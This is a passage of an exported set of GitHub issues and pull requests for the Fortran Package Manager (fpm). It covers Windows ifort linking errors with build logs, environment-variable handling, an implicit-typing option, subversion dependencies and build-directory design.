            "text": "Description\nExternal libraries not correctly added to ifort link on windows\nAbstract\nAlthough I have the option link = \"portaudio_x64\"in the [build] section, the Link command does not include it.  A (possibly related) issue is that fpm uses .a as an extension for libraries on Windows, instead of .lib, this is an issue to work in a multi language environment.\nTool versions\n\n\nfpm 0.4a on Windows-10 64 bits\n\n\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on IA-32, Version 2021.4.0 Build 20210910_000000:\n\n\nThe commands are executed in the intel command line environment:\n  : initializing oneAPI environment...\n  initializing Visual Studio command-line environment...\n  Visual Studio version 16.11.3 environment configured.\n  Visual Studio environment initialized for: 'x64'\n  ...\n\nLocation of library\ndir ..\\portaudio\\build\\msvc\\x64\\Debug\\portaudio_x64*\n\n2021-10-03  16:49           569\u00a0856 portaudio_x64.dll\n2021-10-03  16:49             8\u00a0730 portaudio_x64.exp\n2021-10-03  16:49            15\u00a0114 portaudio_x64.lib\n2021-10-03  16:49         1\u00a0904\u00a0640 portaudio_x64.pdb\n\ntoml\nname = \"ftn_portaudio\"\nversion = \"0.1.0\"\n\n[build]\nauto-executables = true\nauto-examples = true\nlink = \"portaudio_x64\"\n\nEnvironment (not sure which one is required)\nset LIB=..\\portaudio\\build\\msvc\\x64\\Debug;%LIB%\nset LIBPATH=..\\portaudio\\build\\msvc\\x64\\Debug;%LIBPATH%\nset LIBRARY_PATH=..\\portaudio\\build\\msvc\\x64\\Debug;%LIBRARY_PATH%\n\nfpm command and result\nfpm build --compiler ifort\n\nResult in error (no executable produced), see workaround in next section\n U:\\SoftwareDev\\PortAudio\\ftn_portaudio> fpm build --compiler ifort\n\n\n\n + mkdir build\\dependencies\n + mkdir build\\ifort_782887A201FCE169\\ftn_portaudio\n + ifort -c .\\.\\src\\portaudio.f90  /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /traceback /module:build\\ifort_782887A201FCE169\\ftn_portaudio /Ibuild\\ifort_782887A201FCE169\\ftn_portaudio  -o build\\ifort_782887A201FCE169\\ftn_portaudio\\src_portaudio.f90.o\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.4.0 Build 20210910_000000\nCopyright (C) 1985-2021 Intel Corporation.  All rights reserved.\n\n + lib /OUT:build\\ifort_782887A201FCE169\\ftn_portaudio\\libftn_portaudio.a @build\\ifort_782887A201FCE169\\ftn_portaudio\\libftn_portaudio.a.resp\nMicrosoft (R) Library Manager Version 14.29.30133.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\nbuild/ifort_782887A201FCE169/ftn_portaudio/src_portaudio.f90.o\n + ifort -c example\\paex_sine.f90  /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /traceback /module:build\\ifort_782887A201FCE169\\ftn_portaudio /Ibuild\\ifort_782887A201FCE169\\ftn_portaudio  -o build\\ifort_782887A201FCE169\\ftn_portaudio\\example_paex_sine.f90.o\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.4.0 Build 20210910_000000\nCopyright (C) 1985-2021 Intel Corporation.  All rights reserved.\n\nexample\\paex_sine.f90(53): remark #7712: This variable has not been used.   [I]\n    integer :: i, count, default_api, device\n---------------^\nexample\\paex_sine.f90(170): remark #7712: This variable has not been used.   [INPUTBUFFER]\n    function patestCallback(inputBuffer, outputBuffer, frameCount, timeInfo, statusFlags, user_data) bind(C)\n----------------------------^\nexample\\paex_sine.f90(170): remark #7712: This variable has not been used.   [TIMEINFO]\n    function patestCallback(inputBuffer, outputBuffer, frameCount, timeInfo, statusFlags, user_data) bind(C)\n-------------------------------------------------------------------^\nexample\\paex_sine.f90(170): remark #7712: This variable has not been used.   [STATUSFLAGS]\n    function patestCallback(inputBuffer, outputBuffer, frameCount, timeInfo, statusFlags, user_data) bind(C)\n-----------------------------------------------------------------------------^\n + mkdir build\\ifort_782887A201FCE169\\example\\\n + ifort  /warn:all /check:all /error-limit:1 /Od /Z7 /assume:byterecl /traceback /module:build\\ifort_782887A201FCE169\\ftn_portaudio /Ibuild\\ifort_782887A201FCE169\\ftn_portaudio  build\\ifort_782887A201FCE169\\ftn_portaudio\\example_paex_sine.f90.o build\\ifort_782887A201FCE169\\ftn_portaudio\\libftn_portaudio.a -lportaudio_x64 -o build\\ifort_782887A201FCE169\\example\\paex_sine.exe\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.4.0 Build 20210910_000000\nCopyright (C) 1985-2021 Intel Corporation.  All rights reserved.\n\nMicrosoft (R) Incremental Linker Version 14.29.30133.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n-out:build\\ifort_782887A201FCE169\\example\\paex_sine.exe\n-debug\n-pdb:build\\ifort_782887A201FCE169\\example\\paex_sine.pdb\n-subsystem:console\n-incremental:no\nbuild\\ifort_782887A201FCE169\\ftn_portaudio\\example_paex_sine.f90.o\nbuild\\ifort_782887A201FCE169\\ftn_portaudio\\libftn_portaudio.a\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_Initialize referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_GetHostApiCount referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_GetDefaultHostApi referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_GetDefaultOutputDevice referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_GetDeviceInfo referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_OpenStream referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_SetStreamFinishedCallback referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_StartStream referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_Sleep referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_StopStream referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_CloseStream referenced in function MAIN__\nexample_paex_sine.f90.o : error LNK2019: unresolved external symbol Pa_Terminate referenced in function MAIN__\nbuild\\ifort_782887A201FCE169\\example\\paex_sine.exe : fatal error LNK1120: 12 unresolved externals\n<ERROR> Compilation failed for object \" paex_sine.exe \"\n<ERROR>stopping due to failed compilation\nSTOP 1\n\nWork around (with correct executable produced)\nUsing link file:\n-out:build\\ifort_782887A201FCE169\\example\\paex_sine.exe\n-debug\n-pdb:build\\ifort_782887A201FCE169\\example\\paex_sine.pdb\n-subsystem:console\n-incremental:no\nbuild\\ifort_782887A201FCE169\\ftn_portaudio\\example_paex_sine.f90.o\nbuild\\ifort_782887A201FCE169\\ftn_portaudio\\libftn_portaudio.a\nU:\\SoftwareDev\\PortAudio\\portaudio\\build\\msvc\\x64\\Debug\\portaudio_x64.lib\n\nExecute\nu:\\SoftwareDev\\PortAudio\\ftn_portaudio>link @r.lnk\n\nconsole log:\n Microsoft (R) Incremental Linker Version 14.29.30133.0\n Copyright (C) Microsoft Corporation.  All rights reserved.\n\n -out:build\\ifort_782887A201FCE169\\example\\paex_sine.exe\n -debug\n -pdb:build\\ifort_782887A201FCE169\\example\\paex_sine.pdb\n -subsystem:console\n  -incremental:no\n build\\ifort_782887A201FCE169\\ftn_portaudio\\example_paex_sine.f90.o\n build\\ifort_782887A201FCE169\\ftn_portaudio\\libftn_portaudio.a\n U:\\SoftwareDev\\PortAudio\\portaudio\\build\\msvc\\x64\\Debug\\portaudio_x64.lib\n\nAdding the dll library path, the linked program workds Pa_SetStreamFinishedCallback\n set PATH=U:\\SoftwareDev\\PortAudio\\portaudio\\build\\msvc\\x64\\Debug;%PATH%\n build\\ifort_782887A201FCE169\\example\\paex_sine.exe\n\nExpected Behaviour\nThe linker should either find the library or complain that the library was on find on the appropriate path\nVersion of fpm\n0.4.0, alpha - Windows binaries from the site\nPlatform and Architecture\nWindos 10 64 bits\nAdditional Information\nIf useful, I can provide the project for testing",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-10-16 17:19:12+00:00",
                    "text": "Carlos @brocolis, is this also resolved with #590?\nSeems to be the case, closing this issue as resolved."
                }
            ]
        },
        {
            "number": 590,
            "user": "brocolis",
            "date": "2021-10-06 01:29:15+00:00",
            "title": "Change link command on Windows with `ifort` or `ifx`",
            "text": "This PR fixes #589",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-10-06 01:44:29+00:00",
                    "text": "It seems that this special case also applies to LFortran on Windows with MSVC. This PR needs more work."
                },
                {
                    "user": "LKedward",
                    "date": "2021-10-06 07:44:05+00:00",
                    "text": "Thanks Carlos @brocolis! What's the naming convention for *.lib files? Do they always start with lib like on Linux or is it different?"
                },
                {
                    "user": "brocolis",
                    "date": "2021-10-06 11:46:52+00:00",
                    "text": "What's the naming convention for *.lib files? Do they always start with lib like on Linux or is it different?\n\nThey don't always start with lib, it is different, it is usually name.lib, for example kernel32.lib, shell32.lib, etc."
                },
                {
                    "user": "brocolis",
                    "date": "2021-10-13 11:38:24+00:00",
                    "text": "It seems that this special case also applies to LFortran on Windows with MSVC. This PR needs more work.\n\nThis is a separate issue. It requires changes in LFortran."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-13 20:06:40+00:00",
                    "text": "It seems that this special case also applies to LFortran on Windows with MSVC. This PR needs more work.\n\nThis is a separate issue. It requires changes in LFortran.\n\nMaybe LFortran's command line interface could attempt to do a normalization before passing anything through to MSVC's or GCC's linker. This way we don't have to pull any stunts in fpm to check whether the compiler wrapper is currently targeting MSVC or GCC. Not sure how pass-through arguments are currently handled in LFortran, in GCC we have -Wl, to pass arguments to the linker without affecting the compiler wrapper."
                }
            ]
        },
        {
            "number": 587,
            "user": "wiremoons",
            "date": "2021-10-03 08:26:14+00:00",
            "title": "Bootstrapping instructions version update",
            "text": "Updated the 'Bootstrapping instructions' section to instruct on how to install version '0.4.0' instead of past version '0.3.0'.",
            "comments": []
        },
        {
            "number": 585,
            "user": "urbanjost",
            "date": "2021-09-28 14:15:20+00:00",
            "title": "new \"activate\" subcommand",
            "text": "Description\nNAME\n   activate(1) - start a subshell with all newly compiled programs in the\n                 shell command search path.\n\nSYNOPSIS\n   fpm activate [--bindir [DIRECTORY_NAME]] [--list]\n\nDESCRIPTION\n Start a subshell with the designated directory added to the search path.\n Subsequently any application built by fpm(1) will be placed in the directory\n so that it is immediately available for execution. In csh(1) and tcsh(1) a\n rehash(1) command may be required for newly created executables to be located.\n\n Enter \"exit\" to return to the environment that existed before the activate\n command was executed.\n\n While in the subshell the environment variable FPM_BINDIR indicates where\n the latest executables will be stored.\n\nOPTIONS\n --bindir\n          by default executables will be placed in the build/latest\n          subdirectory under the top directory of the current fpm(1) project.\n\n          If this option is present a full pathname must be specified to an\n          existing directory.\n --list   If present, the contents of the current \"activate\" directory, if any,\n          are displayed.\nEXAMPLES\n   sample commands:\n\n    fpm activate\n    fpm activate --bindir $HOME/.local/testbin\n\nPossible Solution\nPer some recent discussions on how to improve running programs as you build them,\nproposing the above command,  which I have working in a basic format in the \"shell\" branch on a\nfork of fpm for anyone that wants to try it, but it currently only is complete enough to try it using the bash shell\nhttps://github.com/urbanjost/fpm\nAdditional Information\nThe is a single-file version for the bash shell that can be pulled with curl(1) or wget(1)  at https://raw.githubusercontent.com/urbanjost/fpm-tools/main/tools/bootstrap/fpm-activate.F90\nAny testing would be appreciated.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-09-28 22:11:54+00:00",
                    "text": "suggestions are welcome. Is build/latest a better name than build/bin?  Should build/bin be deleted on exit or left so it can be resumed? Should a --list that shows the executables in the \"activate\" directory show fullpathnames?  Would a remove using globbing be useful? In verbose mode should it show the name of the \"activate\" directory?  These are just a few things that come to mind, but I want to at least make sure it works with cmd.exe first.\nWhat shells, especially on MSWindows, need supported?\nThere is no thumbs-down button on github, so how many down votes or alternative proposals are there?  We discussed some others on Fortran Discourse.\n\"run cmd -- options\" is not too bad in the current version when using the default compiler and default options unless you want to run in another directory,\nbut when you start using options, especially different ones I have found this, even in a prototype state, preferable myself so far.\nBut by using the recently introduced environment variables or (coming soon?) options in the fpm.toml file that could be kept relatively simple, in which case using -W run_directory would also work for most cases without requiring a subshell and altering the environment.  Obviously, I prefer this approach but curious about other voices and/or even how many people might find this useful."
                }
            ]
        },
        {
            "number": 584,
            "user": "awvwgk",
            "date": "2021-09-28 13:32:05+00:00",
            "title": "Actually read environment variables",
            "text": "Thanks to John @urbanjost for finding this bug.\nCloses #583",
            "comments": []
        },
        {
            "number": 583,
            "user": "urbanjost",
            "date": "2021-09-28 13:23:21+00:00",
            "title": "Not picking up some environment variables",
            "text": "Description\nWas trying some of the options with environment variables and it is not working with some of them, and I believe that if GET_FPM_ENV was concatenating FPM_PREFIX and ENV instead of FPM_PREFIX and VAL that the problem would be resolved. That is, \"fpm_prefix//val\"  should be \"fpm_prefix//env\".\n !> Get an environment variable for fpm, this routine ensures that every  variable    \n !> used by fpm is prefixed with FPM_.\n    function get_fpm_env(env, default) result(val)\n      character(len=*), intent(in) :: env\n      character(len=*), intent(in) :: default\n      character(len=:), allocatable :: val\n      character(len=*), parameter :: fpm_prefix = \"FPM_\"\n      val = get_env(fpm_prefix//val, default)\n    end function get_fpm_env\nend module fpm_command_line\nExpected Behaviour\nI expect that when variables like FPM_FC are set they become the default compiler.\nVersion of fpm\n0.4.0\nPlatform and Architecture\nAll\nAdditional Information\nNo response",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-28 13:32:28+00:00",
                    "text": "Good catch, thanks."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-09-28 23:32:48+00:00",
                    "text": "No problem. You fixed it so fast I thought I hadn't hit the save button earlier and was going to reenter it!"
                }
            ]
        },
        {
            "number": 580,
            "user": "awvwgk",
            "date": "2021-09-24 21:41:01+00:00",
            "title": "Creating Windows installer for fpm",
            "text": "Description\nSince Windows has no actual package manager installing of software is usually expected to be possible by an installer. So far fpm does not explore this road for distribution, we are using binary releases and MinGW packages for pacman instead.\nPossible Solution\nFind out how we can automatically create an installer using GitHub actions\nAdditional Information\n\nhttps://nsis.sourceforge.io/Main_Page\nNuGet packages?",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-11-14 19:53:47+00:00",
                    "text": "Just saw Laurence @LKedward has created an installer for fpm: https://github.com/LKedward/quickstart-fortran"
                },
                {
                    "user": "LKedward",
                    "date": "2021-11-15 06:50:24+00:00",
                    "text": "Yes I had a play around with NSIS as a weekend project and came up with this. I ended up bundling in GFortran, Git and OpenBLAS as well to make an all-in-one installer aimed at beginners. I will share on the Discourse to get feedback - if people find it works well, we could move under Fortran-Lang namespace and link to it from the website perhaps?\nThe same workflow can be adapted to create an fpm+Git for Windows installer in this repository for each release."
                }
            ]
        },
        {
            "number": 579,
            "user": "Carltoffel",
            "date": "2021-09-24 13:38:25+00:00",
            "title": "Fix dir not getting removed after testing fpm",
            "text": "I fixed the name-with-hyphens directory not getting removed after testing fpm. I used this opportunity to refactor the cleanup block a little bit.",
            "comments": []
        },
        {
            "number": 578,
            "user": "urbanjost",
            "date": "2021-09-24 06:52:54+00:00",
            "title": "help text was truncated",
            "text": "Nice. Just a quick errata. A few of the new lines in the help text were being truncated",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-09-24 07:02:34+00:00",
                    "text": "One other change that I was hoping would come out of the discussions was an option to set the variable prefix so that it could be a user-defined value, even a blank character,  so you could set compiler-specific values or even not have a prefix (and so use FC, AR, ...).  So I could set INTEL_FFLAGS and GFORTRAN_FFLAGS and ... and switch to different sets of them just by setting FPM_PRE.  No one liked that?  It would give you a back door to use the default names and if you are using environment variables would let you have compiler-specific sets of them."
                },
                {
                    "user": "LKedward",
                    "date": "2021-09-24 07:28:24+00:00",
                    "text": "So I could set INTEL_FFLAGS and GFORTRAN_FFLAGS and ... and switch to different sets of them just by setting FPM_PRE. No one liked that?\n\nI had not considered the uses of this, but your example with different compilers is a compelling one. We can discuss it more in #576"
                }
            ]
        },
        {
            "number": 577,
            "user": "awvwgk",
            "date": "2021-09-23 20:30:22+00:00",
            "title": "Support disabling of implicit typing in package manifest",
            "text": "Motivation\nAllow packages to opt-out from default implicit typing in Fortran. This allows to get the full befits of implicit none in every scope without having to remember typing it.\nMore difficult is whether we can find options in every compiler to actually guarantee that this is working.\nSpecification\nThe build table seems most appropriate for this option:\n[build]\nimplicit-typing = false\nPrior Art\nCompiler flags:\n\n\n\ncompiler\noption\n\n\n\n\nGFortran\n-fimplicit-none\n\n\nNVHPC\n-Mdclchk\n\n\nnagfor\n-u\n\n\nCray/HPE\n-eI\n\n\nSilverFrost FTN95\n/IMPLICIT_NONE\n\n\nifort (Windows)\n/warn:declarations,errors\n\n\nifort (Linux, macOS)\n-warn declarations,errors\n\n\nflang\n-fimplicit-none-type-always\n\n\nIBM XL Fortran\n-qundef or -u\n\n\n\nAdditional Information\nRelated issue #359\nDraft PR: #506",
            "comments": [
                {
                    "user": "epagone",
                    "date": "2021-09-23 21:04:52+00:00",
                    "text": "As mentioned in the linked PR, I'd like to give this a try, if you agree. If you do, any pointers are welcome."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-23 22:07:24+00:00",
                    "text": "Alright, here is a brief outline of a strategy to implement this feature. All references are based on the patch from #575.\nTo implement this feature we need to represent it in the package manifest, this happens in the derived types defined in src/fpm/manifest, every table has a corresponding source file there. For the implicit-typing I'd recommend to add another logical in the build table, you can follow one of the existing logical data types defined there.\n\n  \n    \n      fpm/src/fpm/manifest/build.f90\n    \n    \n        Lines 22 to 23\n      in\n      beaf9a8\n    \n    \n    \n    \n\n        \n          \n           !> Configuration data for build \n        \n\n        \n          \n           type :: build_config_t \n        \n    \n  \n\n\nThe next step is to get the information into the fpm model, since this is a package resolved option, it shouldn't go into the top-level, but should be included in the package_t:\n\n  \n    \n      fpm/src/fpm_model.f90\n    \n    \n        Lines 96 to 105\n      in\n      beaf9a8\n    \n    \n    \n    \n\n        \n          \n           !> Type for describing a single package \n        \n\n        \n          \n           type package_t \n        \n\n        \n          \n            \n        \n\n        \n          \n               !> Name of package \n        \n\n        \n          \n               character(:), allocatable :: name \n        \n\n        \n          \n            \n        \n\n        \n          \n               !> Array of sources \n        \n\n        \n          \n               type(srcfile_t), allocatable :: sources(:) \n        \n\n        \n          \n            \n        \n\n        \n          \n           end type package_t \n        \n    \n  \n\n\nThe package_t in the fpm model is build from the package manifest in src/fpm.f90:\n\n  \n    \n      fpm/src/fpm.f90\n    \n    \n        Lines 159 to 160\n      in\n      beaf9a8\n    \n    \n    \n    \n\n        \n          \n           model%packages(i)%name = dependency%name \n        \n\n        \n          \n           if (.not.allocated(model%packages(i)%sources)) allocate(model%packages(i)%sources(0)) \n        \n    \n  \n\n\nOnce you have the information about the implicit typing in the model, it must be made accessible in the target generation (src/fpm_targets.f90). The loop over the packages in the model is the right place to extract this information:\n\n  \n    \n      fpm/src/fpm_targets.f90\n    \n    \n         Line 195\n      in\n      beaf9a8\n    \n    \n    \n    \n\n        \n          \n           do j=1,size(model%packages) \n        \n    \n  \n\n\nEventually, the correct flag should be added to the compile_flags of the array of build_target_ptr. Adding it to the compile_flags for the Fortran targets automatically takes care everything (including the build hash), there is no need to adjust the build backend.\nThe remaining issue is to get the correct command line argument for enabling this option, the model has a compiler object which can be adjusted to provide the correct argument:\n\n  \n    \n      fpm/src/fpm_compiler.f90\n    \n    \n        Lines 72 to 81\n      in\n      beaf9a8\n    \n    \n    \n    \n\n        \n          \n           !> Definition of compiler object \n        \n\n        \n          \n           type :: compiler_t \n        \n\n        \n          \n               !> Identifier of the compiler \n        \n\n        \n          \n               integer(compiler_enum) :: id = id_unknown \n        \n\n        \n          \n               !> Path to the Fortran compiler \n        \n\n        \n          \n               character(len=:), allocatable :: fc \n        \n\n        \n          \n               !> Path to the C compiler \n        \n\n        \n          \n               character(len=:), allocatable :: cc \n        \n\n        \n          \n               !> Print all commands \n        \n\n        \n          \n               logical :: echo = .true."
                },
                {
                    "user": "epagone",
                    "date": "2021-09-23 22:24:54+00:00",
                    "text": "Wow, thank you so much Sebastian @awvwgk !"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-23 22:31:43+00:00",
                    "text": "You're welcome."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-09-29 22:38:08+00:00",
                    "text": "I've updated the table of options with more compilers (see original issue post). Here are the sources for each of them:\n\nnagfor\nSilverFrost FTN95\nCray/HPE\nflang\nXL Fortran (IBM)\nifort\n\n@certik, do you have a flag for LFortran already?"
                },
                {
                    "user": "certik",
                    "date": "2021-09-29 23:16:14+00:00",
                    "text": "It's the default in lfortran. I am in a process of adding a flag to enable implicit typing."
                }
            ]
        },
        {
            "number": 576,
            "user": "awvwgk",
            "date": "2021-09-23 19:49:41+00:00",
            "title": "Implement option for using non-prefixed environment variables",
            "text": "Description\nFor integration in packaging systems like conda-build or spack or to seamlessly work with environment modules fpm could allow an option to use non-prefixed environment variables.\n\n--compiler, FPM_FC, FC to set Fortran compiler\n--c-compiler, FPM_CC, CC to set C compiler\n--archiver, FPM_AR, AR to set archiver\n--flag, FPM_FFLAGS, FFLAGS to set Fortran compiler flags\n--c-flag, FPM_CFLAGS, CFLAGS to set C compiler flags\n--link-flag, FPM_LDFLAGS, LDFLAGS to set linker flags\n\nThe non-prefixed environment variables will not be used by default to avoid picking up environment variables by accident, i.e. using the non-prefixed variables is always opt-in.\nPossible Solution\nUse command line flag --env or similar to activate usage of compiler variables. Always provide an option to show to show where a particular default originated from.\nAdditional Information\nFollow-up from #549",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-09-24 07:29:34+00:00",
                    "text": "Comment from @urbanjost :\n\nOne other change that I was hoping would come out of the discussions was an option to set the variable prefix so that it could be a user-defined value, even a blank character, so you could set compiler-specific values or even not have a prefix (and so use FC, AR, ...). So I could set INTEL_FFLAGS and GFORTRAN_FFLAGS and ... and switch to different sets of them just by setting FPM_PRE. No one liked that? It would give you a back door to use the default names and if you are using environment variables would let you have compiler-specific sets of them.\n\n\nThis use case of different compiler flags is a compelling reason to do this IMO."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-11-18 09:44:31+00:00",
                    "text": "I think the proposed PR #608 satisfied the original post without introducing some of the perils associated with using environment variables as an opt-in is required, and easily allows setting groups of variables for specific compilers. It also allows for user-defined names for groups of variables for the case where you want multiple choices for the same compiler. All new variable names are required to begin with FPM_ so they are  easier to identify and list as well."
                }
            ]
        },
        {
            "number": 575,
            "user": "awvwgk",
            "date": "2021-09-20 21:48:02+00:00",
            "title": "Enable multiple build output directories",
            "text": "This patch implements the possibility to have multiple build output directories depending on the compile flags of the respective target. This will currently only be realized for C objects, since they do not use the compile arguments of any profile.\n\nremove output_directory from model and replace it with build_prefix the build prefix is generated from the toolchain (Fortran compiler currently)\noutput name, directory and file path are saved in target\nobject targets can have different module output directories depending on the compile arguments\nall object targets can access all module output directories via include flags (could be refined by providing only access to the required directories from the module interdependencies later)\nall output directories are created in the backend\nexecutables will include libraries they link against in the build hash\nfix installation of module files\n\nTo discuss (possibly for a follow-up patch):\n\nshould executable target include the (all) link arguments in the build hash? Which arguments, only the libs or also the objects?\nshould the archive include the object files in the build hash?\n\nTo do:\n\nfix installation of module files\n\nCloses #422",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-09-21 11:53:58+00:00",
                    "text": "Thanks Sebastian - I'm quite busy this week, but I should be able to find some time next week to review this."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-23 20:03:28+00:00",
                    "text": "Carlos @brocolis, this should address the issues with relinking the executables upon changes of the link entry in the package manifest now as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-27 12:07:06+00:00",
                    "text": "I know Jakub had to implement something similar for his work - presumably we'll need to merge this into that?\n\nExactly, it is based on Jakub's design in #498. I think we can rebase the branch after this change is merged, which should take care of most of the current merge conflicts present."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-27 12:17:57+00:00",
                    "text": "Please don't merge yet, I still have to look into collecting all module files from the output directory for fpm install."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-06 19:52:29+00:00",
                    "text": "Will try to finish it this week. Only thing missing is a function that can return the path to all module files from the projects. This should be possible by iterating over the targets and combine the provided module file basenames with the output directory and than copy the complete list in the install command."
                }
            ]
        },
        {
            "number": 574,
            "user": "awvwgk",
            "date": "2021-09-20 11:23:10+00:00",
            "title": "Support subversion dependencies",
            "text": "Motivation\nSubversion (svn) is a commonly used version control system for many larger Fortran projects. Proper support for handling dependencies from subversion repositories would be required for those projects to adopt fpm.\nSpecification\nSimilar to the git dependencies we want to easily specify them with a dotted key-value pair in one line:\n[dependencies]\nexample.svn = \"svn+https://svn.example.com/my-project\"\nFurther specification like pinning to a certain revision or a branch have to be investigated.\nPrior Art\n\nsvn support in pip: https://pip.pypa.io/en/stable/topics/vcs-support/#subversion\n\nAdditional Information\n\nsvn homepage: https://subversion.apache.org/\nsvn hosting: https://sourceforge.net/\nsvn hosting: https://osdn.net/\npoll: https://fortran-lang.discourse.group/t/1791",
            "comments": []
        },
        {
            "number": 572,
            "user": "Sideboard",
            "date": "2021-09-19 19:40:50+00:00",
            "title": "Build no tests by default",
            "text": "Fixes #92\n\nChange default behavior of build to exclude tests (sources with FPM_SCOPE_TEST)\nAdd command line option --test to force building tests\nUpdate help messages",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-09-21 13:39:02+00:00",
                    "text": "Thanks very much @Sideboard! This all looks good - I agree with Sebastian's comment regarding the logical value, I think it is fine to include it in the model."
                },
                {
                    "user": "Sideboard",
                    "date": "2021-09-23 08:37:53+00:00",
                    "text": "I changed the structure and renamed the internal settings name from test to build_tests to avoid semantic clashes due to inheritance (the external build option is still --test).\nShall I \u2026\n\n\u2026 squash the commits?\n\u2026 remove the leftover space changes in call targets_from_sources(targets, model, error)?"
                },
                {
                    "user": "Sideboard",
                    "date": "2021-09-23 08:49:10+00:00",
                    "text": "Merge-squash is fine with me and there is no need for a bare rebase as far as I see. The second commit message can be scrapped."
                },
                {
                    "user": "Sideboard",
                    "date": "2021-09-23 09:09:02+00:00",
                    "text": "I just realized that the cargo option is --tests instead of --test. Should change that before the merge.\n\n--test name...\nBuild the specified integration test. This flag may be specified multiple times and supports common Unix glob patterns.\n--tests\nBuild all targets in test mode that have the test = true manifest flag set. By default this includes the library and binaries built as unittests, and integration tests. Be aware that this will also build any required dependencies, so the lib target may be built twice (once as a unittest, and once as a dependency for binaries, integration tests, etc.). Targets may be enabled or disabled by setting the test flag in the manifest settings for the target."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-23 09:44:28+00:00",
                    "text": "Thanks, I'll go ahead and merge."
                },
                {
                    "user": "certik",
                    "date": "2021-09-23 18:27:37+00:00",
                    "text": "Thank you @Sideboard for this contribution!"
                }
            ]
        },
        {
            "number": 570,
            "user": "Beliavsky",
            "date": "2021-09-15 16:55:38+00:00",
            "title": "Using fpm on both Windows and WSL on the same code",
            "text": "The Windows directory c:\\foo is mapped to /mnt/c/foo on Windows Subsystem for Linux. If I run fpm build and fpm test for some code in c:\\foo, and I then go to WSL and run the same commands in /mnt/c/foo, I get errors, I think because the WSL object files *.o are not the same as those on Windows. I resolve the error by manually deleting old .o and .mod files.\nIs there a way to tell fpm to recompile all source files, even if it looks like the object file is more recent than the source file? Alternatively, could fpm have a command to get rid of object files and .mod files from previous compilations?",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-15 17:11:05+00:00",
                    "text": "Well, there is not much we can do, if you have two different operation systems sharing the same filesystem. A similar issue will apply for using MSYS2 under Windows, which has different environments, like msys2, mingw64, or ucrt64, depending on the MSYS2 terminal you are using, but the identical name for the Fortran compiler.\nOne option which is useful when working with cross and native compilers on the same system is to use the exact name of the compiler rather than the general name, on Linux/x86_64 this would be x86_64-pc-linux-gnu-gfortran instead of gfortran. In case of MSYS2 this might still be insufficient to distinguish the different compilers.\nThere is no clear solution here in my opinion, we could expand the build hash and try to get as much information as possible from the environment to create unique hashes and allow switching from one compiler version to another. But keep in mind that this kind of detection must be fast because fpm is supposed to run it on every invocation."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-09-16 02:59:15+00:00",
                    "text": "That has been nagging me for a while, and the solution I would like to see is that the build directory include a platform name as\nwell, which has worked for me for a long time. In my own case my build scripts create a directory combining the system type with the compiler. The first issue is there is no purely \"fortranic\" way to get a system type, as even the C uname(3c) function is not available on all platforms. It was very common for me where my build scripts grew up to have my code in a directory that was NFS mounted to a number of different platforms and I wanted to be able to build on all of them simultaneously but I had not seen people complaining about that, and git(1) lets you easily create a separate copy for each build if you want, so it had not come up till now. The info returned by COMPILER_VERSION(3f) and/or  COMPILER_OPTIONS(3f) contains some system type info with some compilers and not with others so it is not a good choice.\nFor the problem you show I have using a kluge where I add \"--flag -D Solaris\" so you get a unique build. I was making a wrapper script for the compiler so I got unique build directory names that way too but that did not seem like a good way to go.\nIn my scripts by default the system type is determined by a command called \"system_type\" on each platform (that just calls uname(1) on the machines I run on now), but it does allow you to specify an environment variable instead. Don't want to overuse environment variables but maybe that is justified in this case.\nWe could try to harden up the routine that determines system type as well in fpm(1) now and use that as well. An environment variable like FPM_SYSTEM_TYPE might the way to go, but by default use what fpm(1) does now and improve on it as time passes.  I would probably suggest both be used; the default being to add what the routine calculates, but since it is guessing have a failsafe in that the variable can be used when that fails.\nI have been doing something similiar when on nodes that are the same type but have different versions of a compiler installed, or are allowing different versions to be used via the modules(1) command as well.\nAnd of course deleting the build directory, or making a clone via \"git clone\" for a build 